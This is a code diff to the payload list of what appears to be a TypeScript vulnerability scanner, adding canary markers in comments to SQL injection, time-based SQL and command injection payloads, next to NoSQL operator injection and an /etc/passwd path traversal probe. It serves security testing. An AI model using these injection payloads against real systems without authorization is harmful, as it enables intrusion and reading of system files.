@@ -107,16 +107,17 @@ function normalizeForPolicy(text: string): string {
  * pone el propio HTML de la página que refleja el payload. Los delays van de 0 a 2 s.
  */
 export const PAYLOAD_TEMPLATES: readonly Payload[] = [
-  { class: 'sqli', template: "'", oracle: 'sql-error' },
-  { class: 'sqli', template: "' OR '1'='1", oracle: 'sql-error' },
-  { class: 'sqli', template: "1' OR '1'='1'--", oracle: 'sql-error' },
-  { class: 'sqli', template: "1' AND SLEEP({{delay}})-- -", oracle: 'timing', timing: true },
-  { class: 'sqli', template: "1'; SELECT pg_sleep({{delay}})-- -", oracle: 'timing', timing: true },
+  // El canario va en un comentario inocuo (SQL `/* */`, shell `#`) para que llegue como texto al sink del agente.
+  { class: 'sqli', template: "'/*{{canary}}*/", oracle: 'sql-error' },
+  { class: 'sqli', template: "' OR '1'='1/*{{canary}}*/", oracle: 'sql-error' },
+  { class: 'sqli', template: "1' OR '1'='1'/*{{canary}}*/--", oracle: 'sql-error' },
+  { class: 'sqli', template: "1' AND SLEEP({{delay}})/*{{canary}}*/-- -", oracle: 'timing', timing: true },
+  { class: 'sqli', template: "1'; SELECT pg_sleep({{delay}})/*{{canary}}*/-- -", oracle: 'timing', timing: true },
   { class: 'nosqli', template: '{{canary}}', oracle: 'diff', bracket: '[$ne]' },
   { class: 'nosqli', template: '', oracle: 'diff', bracket: '[$gt]' },
-  { class: 'cmdi', template: '; sleep {{delay}}', oracle: 'timing', timing: true },
-  { class: 'cmdi', template: '| sleep {{delay}}', oracle: 'timing', timing: true },
-  { class: 'cmdi', template: '$(sleep {{delay}})', oracle: 'timing', timing: true },
+  { class: 'cmdi', template: '; sleep {{delay}} #{{canary}}', oracle: 'timing', timing: true },
+  { class: 'cmdi', template: '| sleep {{delay}} #{{canary}}', oracle: 'timing', timing: true },
+  { class: 'cmdi', template: '$(sleep {{delay}}) #{{canary}}', oracle: 'timing', timing: true },
   { class: 'cmdi', template: '; echo {{canary}}', oracle: 'reflection' },
   { class: 'cmdi', template: '$(echo {{canary}})', oracle: 'reflection' },
   { class: 'path-traversal', template: '../../../../etc/passwd', oracle: 'reflection' },
